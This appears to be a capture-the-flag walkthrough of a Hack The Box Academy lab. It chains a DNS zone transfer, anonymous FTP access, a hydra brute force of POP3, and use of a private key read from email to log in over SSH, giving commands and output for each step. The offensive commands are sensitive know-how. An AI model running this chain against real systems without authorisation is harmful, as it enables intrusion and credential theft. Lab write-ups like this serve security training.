# HTB Academy — Attacking Common Services: Skills Assessment Medium

| Field | Details |
|---|---|
| Platform | Hack The Box Academy |
| Module | 11 — Attacking Common Services |
| Lab | Skills Assessment — Medium |
| Difficulty | Medium |
| OS | Linux (Ubuntu 20.04) |
| Target IP | 10.129.183.208 |
| Hostname | lin-medium |
| Date | April 2026 |

---

## Lab Objective

"Assess the target server and find the flag.txt file. Submit the contents as your answer."

Zero credentials. Zero hints. One IP. Six services chained — each one feeds the next. No single service gives the flag alone.

---

## Attack Chain Summary

```
Nmap → DNS(53), POP3(110), SSH(22) — Ubuntu Linux
dig AXFR inlanefreight.htb @IP → full internal DNS map → int-ftp.inlanefreight.htb discovered
Add int-ftp.inlanefreight.htb to /etc/hosts
nmap -p- int-ftp.inlanefreight.htb → FTP on non-standard port 30021 (ProFTPD)
FTP anonymous login on port 30021 → directory: simon/ → download mynotes.txt → 5 passwords
hydra -l simon -P mynotes.txt pop3://IP → simon:8Ns8j1b!23hs4921smHzwn
nc -nv IP 110 → POP3 login → retr 1 → email from Admin contains SSH private key
Save key → sed 's/ /\n/g' → chmod 600 id_rsa
ssh -i id_rsa simon@IP → shell as simon → cat flag.txt
```

---

## Phase 1 — Initial Nmap Scan

```bash
Hackerpatel007_1@htb[/htb]$ nmap -A 10.129.183.208
```

**Output:**

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.183.208
Host is up (0.085s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
53/tcp  open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE RESP-CODES USER CAPA TOP SASL UIDL PIPELINING
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 31.74 seconds
```

**Analysis:**

| Port | Service | Immediate Action |
|---|---|---|
| 53 | ISC BIND 9.16.1 DNS | Attempt zone transfer immediately — always |
| 110 | Dovecot POP3 | Email service — needs credentials first |
| 22 | OpenSSH 8.2p1 | Final access vector — needs credentials or key |

DNS on port 53 with BIND running on a target machine is almost always a zone transfer candidate. This is the highest-value recon technique per second of effort — if misconfigured, a single query returns the entire internal DNS database.

---

## Phase 2 — DNS Zone Transfer

A DNS zone transfer (AXFR) replicates all DNS records from a name server. When misconfigured, any host can request the full zone — instantly exposing every hostname, subdomain, and internal IP in the organisation.

```bash
Hackerpatel007_1@htb[/htb]$ dig AXFR inlanefreight.htb @10.129.183.208
```

| Part | Purpose |
|---|---|
| `dig` | DNS lookup tool |
| `AXFR` | Full zone transfer request |
| `inlanefreight.htb` | Domain to transfer |
| `@10.129.183.208` | Query this specific DNS server |

**Output:**

```
; <<>> DiG 9.18.1-1ubuntu1.1-Ubuntu <<>> AXFR inlanefreight.htb @10.129.183.208
;; global options: +cmd
inlanefreight.htb.        604800 IN SOA   ns.inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.        604800 IN NS    ns.inlanefreight.htb.
app.inlanefreight.htb.    604800 IN A     10.129.200.5
dc1.inlanefreight.htb.    604800 IN A     10.129.100.10
dc2.inlanefreight.htb.    604800 IN A     10.129.200.10
int-ftp.inlanefreight.htb 604800 IN A     127.0.0.1
int-nfs.inlanefreight.htb 604800 IN A     10.129.200.70
ns.inlanefreight.htb.     604800 IN A     127.0.0.1
un.inlanefreight.htb.     604800 IN A     10.129.200.142
ws1.inlanefreight.htb.    604800 IN A     10.129.200.101
ws2.inlanefreight.htb.    604800 IN A     10.129.200.102
wsus.inlanefreight.htb.   604800 IN A     10.129.200.80
inlanefreight.htb.        604800 IN SOA   ns.inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
```

The zone transfer succeeded — the entire internal infrastructure is now mapped. Every hostname, every IP, every service.

**Key finding — int-ftp.inlanefreight.htb:**

```
int-ftp.inlanefreight.htb  A  127.0.0.1
```

`int-ftp` = internal FTP. The `int-` prefix signals an internal testing service — these are almost always poorly secured. The `127.0.0.1` IP means loopback — the FTP service runs on the same machine as the DNS server. The target IP is the FTP server.

---

## Phase 3 — Add vHost to /etc/hosts

```bash
Hackerpatel007_1@htb[/htb]$ sudo sh -c 'echo "10.129.183.208 int-ftp.inlanefreight.htb" >> /etc/hosts'
```

Services configured to use virtual hosting respond differently based on the hostname in the request. Adding the discovered hostname to `/etc/hosts` ensures all tools connect using the correct hostname rather than the bare IP — some services only respond to their configured name.

---

## Phase 4 — Full Port Scan on Discovered Hostname

The initial scan only covered top 1000 ports. Internal testing services frequently run on non-standard ports to avoid casual detection. Scan all 65535 ports:

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p- -T4 -A int-ftp.inlanefreight.htb
```

**Output (relevant section):**

```
PORT      STATE SERVICE VERSION
30021/tcp open  unknown
| fingerprint-strings:
|   GenericLines:
|_    220 ProFTPD Server (Internal FTP) [10.129.183.208]
```

Critical finding: FTP is on port **30021** — not the standard port 21. A default nmap scan would have missed this entirely. The banner confirms ProFTPD — an FTP server that commonly allows anonymous access in testing configurations.

---

## Phase 5 — FTP Anonymous Login

Anonymous login allows access without real credentials. ProFTPD can be configured to accept the username `anonymous` with any password. This is a legacy feature designed for public file distribution, frequently left enabled on internal servers.

```bash
Hackerpatel007_1@htb[/htb]$ ftp int-ftp.inlanefreight.htb 30021
```

**Session:**

```
Connected to int-ftp.inlanefreight.htb.
220 ProFTPD Server (Internal FTP) [10.129.183.208]
Name (int-ftp.inlanefreight.htb:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: (press Enter)
230 Anonymous access granted, restrictions apply

ftp> ls
```

**Output:**

```
229 Entering Extended Passive Mode (|||58127|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
226 Transfer complete
```

A directory named `simon` — this is a username. Whoever simon is, they stored files in an anonymous FTP share that anyone can access.

```
ftp> cd simon
ftp> ls
```

**Output:**

```
-rw-r--r--   1 ftp      ftp           115 Apr 18  2022 mynotes.txt
```

```
ftp> get mynotes.txt
ftp> bye
```

```bash
Hackerpatel007_1@htb[/htb]$ cat mynotes.txt
```

**Output:**

```
8Ns8j1b!23hs4921smHzwn
hxhPENs8LXED0AM0I4qaxB
YaZG0CAbHbKjOGLaQhGa9Vr
DsMvKrJTrE4JHXBsBimBVBgq
2Z3SjOgEJGRShNhqNLZCMARS
```

What this is: A password list stored in a file accessible via anonymous FTP. `simon` (the directory owner) left their candidate passwords on a public file share. These five passwords need to be tested against every service that accepts simon's credentials.

---

## Phase 6 — POP3 Password Brute Force

Username: `simon` (inferred from FTP directory name). Passwords: the five entries from `mynotes.txt`. POP3 is open on port 110 — test all five passwords.

```bash
Hackerpatel007_1@htb[/htb]$ hydra -l simon -P mynotes.txt pop3://10.129.183.208
```

| Flag | Purpose |
|---|---|
| `-l simon` | Single known username |
| `-P mynotes.txt` | The password list found on FTP |
| `pop3://` | Target protocol and port |

**Output:**

```
Hydra v9.4 (c) 2022 by van Hauser/THC
[DATA] max 16 tasks per 1 server, overall 16 tasks, 5 login tries
[DATA] attacking pop3://10.129.183.208:110/
[110][pop3] host: 10.129.183.208   login: simon   password: 8Ns8j1b!23hs4921smHzwn
1 of 1 target successfully completed, 1 valid password found
```

Credentials confirmed: `simon:8Ns8j1b!23hs4921smHzwn`

The first password in `mynotes.txt` was correct. Simon wrote his password into a file and left it on an anonymous FTP share — a direct example of the operational security failures penetration tests are designed to find.

---

## Phase 7 — Read Email via POP3

POP3 is a plain-text protocol — interact with it manually using Netcat. Internal emails between staff are the highest-value intelligence in any engagement: credentials, private keys, internal documentation, and system access details appear regularly.

```bash
Hackerpatel007_1@htb[/htb]$ nc -nv 10.129.183.208 110
```

| Flag | Purpose |
|---|---|
| `-n` | No DNS resolution — connect directly by IP |
| `-v` | Verbose — show connection status |

**Full POP3 session:**

```
Connection to 10.129.183.208 110 port [tcp/*] succeeded!
+OK Dovecot (Ubuntu) ready.

USER simon
+OK

PASS 8Ns8j1b!23hs4921smHzwn
+OK Logged in.

LIST
+OK 1 messages:
1 1630
.
```

One email of 1630 bytes. Retrieve it:

```
RETR 1
+OK 1630 octets
Return-Path: <root@inlanefreight.htb>
Delivered-To: simon@inlanefreight.htb
From: Admin <root@inlanefreight.htb>
To: simon@inlanefreight.htb
Subject: New Access

Hi,

Here is your new key Simon. Enjoy and have a nice day..

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4
[full key content]
-----END OPENSSH PRIVATE KEY-----

QUIT
+OK Logging out.
```

An SSH private key delivered via plaintext internal email. The admin sent simon his SSH access key over an unencrypted mail service. This key authenticates simon to the SSH server — no password needed.

---

## Phase 8 — Save SSH Key and Set Permissions

An SSH private key must be saved to a file with strict permissions before it can be used. SSH enforces that private key files are not readable by other users — if permissions are too open, SSH refuses to use the key entirely.

The key arrives from the email with spaces instead of newlines (formatting artifact from email transmission). Fix with `sed`:

```bash
Hackerpatel007_1@htb[/htb]$ echo '-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAA...[full key]...-----END OPENSSH PRIVATE KEY-----' | sed 's/ /\n/g' > id_rsa
```

| Command Part | Purpose |
|---|---|
| `echo '...'` | Output the raw key string |
| `\| sed 's/ /\n/g'` | Replace every space with a newline — restores proper key format |
| `> id_rsa` | Write formatted key to file |

Alternatively, paste the key manually into a text editor — ensure each line break is correct and no trailing spaces exist.

**Set correct permissions — mandatory:**

```bash
Hackerpatel007_1@htb[/htb]$ chmod 600 id_rsa
```

**Without chmod 600:**

```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
Bad permissions: ignore key: id_rsa
simon@10.129.183.208: Permission denied (publickey).
```

SSH will completely refuse to use a world-readable key. `chmod 600` is non-negotiable — execute it immediately after saving any private key.

---

## Phase 9 — SSH Login and Flag

```bash
Hackerpatel007_1@htb[/htb]$ ssh -i id_rsa simon@10.129.183.208
```

| Flag | Purpose |
|---|---|
| `-i id_rsa` | Use this private key file for authentication |
| `simon` | Username |
| `@10.129.183.208` | Target IP |

**First connection prompt:**

```
The authenticity of host '10.129.183.208 (10.129.183.208)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.183.208' (ECDSA) to the list of known hosts.
```

Type `yes` — adds the server fingerprint to `~/.ssh/known_hosts`.

**Output:**

```
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)

simon@lin-medium:~$
```

**Shell as simon ✅**

Enumerate immediately before reading the flag:

```bash
simon@lin-medium:~$ whoami
simon

simon@lin-medium:~$ id
uid=1000(simon) gid=1000(simon) groups=1000(simon)

simon@lin-medium:~$ ls -la
total 32
drwxr-xr-x 4 simon simon 4096 Apr 18  2022 .
drwxr-xr-x 3 root  root  4096 Apr 18  2022 ..
-rw-r--r-- 1 simon simon  220 Apr 18  2022 .bash_logout
-rw-r--r-- 1 simon simon 3526 Apr 18  2022 .bashrc
drwx------ 2 simon simon 4096 Apr 18  2022 .cache
-rw-r--r-- 1 simon simon  807 Apr 18  2022 .profile
drwx------ 2 simon simon 4096 Apr 18  2022 .ssh
-rw-r--r-- 1 simon simon   27 Apr 18  2022 flag.txt

simon@lin-medium:~$ cat flag.txt
```

**Output:**

```
HTB{...flag_redacted...}
```

**Flag captured ✅**

---

## Why This is Medium Difficulty

| Challenge | Why It Is Harder Than Easy |
|---|---|
| DNS zone transfer required | Extra recon step before knowing what to attack |
| Non-standard port (30021) | Requires `-p-` — default scan misses it completely |
| Username inference | `simon/` directory on FTP = username, not stated |
| Credential reuse chain | FTP wordlist → POP3 brute force — connection must be made |
| SSH key formatting | Key from email has spaces instead of newlines — must be fixed |
| chmod 600 enforcement | SSH refuses to use world-readable keys — non-obvious error |

Every step requires the previous step's output. Skip any single step and the chain breaks.

---

## Lessons Learned

The DNS zone transfer was the most impactful single command in this lab. One query returned the entire internal network map — domain controllers, workstations, NFS servers, the FTP target. DNS zone transfer misconfiguration is extremely common in real environments and takes two seconds to test. It should be the first thing attempted whenever port 53 appears in a scan.

The non-standard FTP port (30021) reinforced the importance of `-p-` in every scan. Default nmap scans cover the top 1000 ports. Internal and development services are routinely placed on non-standard ports precisely because they are not meant for external access. The critical service in this lab would have been completely invisible to a default scan. Scanning all ports on every target is not optional.

The username inference from the FTP directory name was a small but important step in methodology. The tool did not tell us simon is the username — the directory structure did. Reading what the environment shows rather than waiting for a tool to announce something is the core skill that separates manual enumeration from running automated scripts blindly.

The SSH key arriving from email via POP3 with spaces instead of newlines was a formatting issue that would have silently broken the key if not corrected. The `sed 's/ /\n/g'` fix is the right approach — and if that fails, manually pasting the key into a text editor and checking each line break works equally well. The `chmod 600` error from SSH is also easy to miss if you do not read the error message carefully. Both issues are solvable in under a minute once you know what to look for.

---

## Full Attack Chain Reference

```
1.  nmap -A 10.129.183.208
    → DNS(53) ISC BIND 9.16.1, POP3(110) Dovecot, SSH(22) OpenSSH 8.2p1
    → OS: Ubuntu Linux

2.  dig AXFR inlanefreight.htb @10.129.183.208
    → Zone transfer succeeds — full internal DNS map revealed
    → int-ftp.inlanefreight.htb → 127.0.0.1 (runs on target machine)

3.  sudo sh -c 'echo "10.129.183.208 int-ftp.inlanefreight.htb" >> /etc/hosts'

4.  nmap -p- -T4 -A int-ftp.inlanefreight.htb
    → Port 30021 open — ProFTPD Server (non-standard port)

5.  ftp int-ftp.inlanefreight.htb 30021
    user: anonymous / pass: (empty)
    → 230 Anonymous access granted
    → ls → directory: simon/
    → get mynotes.txt → 5 candidate passwords

6.  hydra -l simon -P mynotes.txt pop3://10.129.183.208
    → simon:8Ns8j1b!23hs4921smHzwn

7.  nc -nv 10.129.183.208 110
    USER simon → PASS 8Ns8j1b!... → LIST → RETR 1
    → Email from Admin contains SSH private key

8.  echo '[key]' | sed 's/ /\n/g' > id_rsa
    chmod 600 id_rsa

9.  ssh -i id_rsa simon@10.129.183.208
    → simon@lin-medium:~$ (shell confirmed ✅)

10. cat flag.txt → HTB{...flag_redacted...} ✅
```

---

## POP3 Command Reference

| Command | Purpose |
|---|---|
| `USER <username>` | Identify the account |
| `PASS <password>` | Authenticate |
| `LIST` | Show all messages with index and size |
| `RETR <n>` | Retrieve and display message n |
| `DELE <n>` | Mark message n for deletion |
| `QUIT` | Disconnect — deletions are applied on exit |

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -A <IP>` | Aggressive scan — version, scripts, OS detection |
| `dig AXFR <domain> @<IP>` | Attempt DNS zone transfer |
| `sudo sh -c 'echo "<IP> <hostname>" >> /etc/hosts'` | Add discovered vhost to hosts file |
| `nmap -p- -T4 -A <hostname>` | Full port scan with all 65535 ports |
| `ftp <hostname> <port>` | Connect to FTP on non-standard port |
| `ftp> ls` | List files in current directory |
| `ftp> get <file>` | Download file |
| `cat mynotes.txt` | Read downloaded password list |
| `hydra -l <user> -P <wordlist> pop3://<IP>` | POP3 brute force |
| `nc -nv <IP> 110` | Manual POP3 interaction via Netcat |
| `USER <username>` | POP3 authentication — step 1 |
| `PASS <password>` | POP3 authentication — step 2 |
| `LIST` | POP3 — list all emails |
| `RETR 1` | POP3 — retrieve first email |
| `echo '[key]' \| sed 's/ /\n/g' > id_rsa` | Fix SSH key line formatting from email |
| `chmod 600 id_rsa` | Set required key permissions |
| `ssh -i id_rsa <user>@<IP>` | SSH login using private key |
| `cat flag.txt` | Read flag |
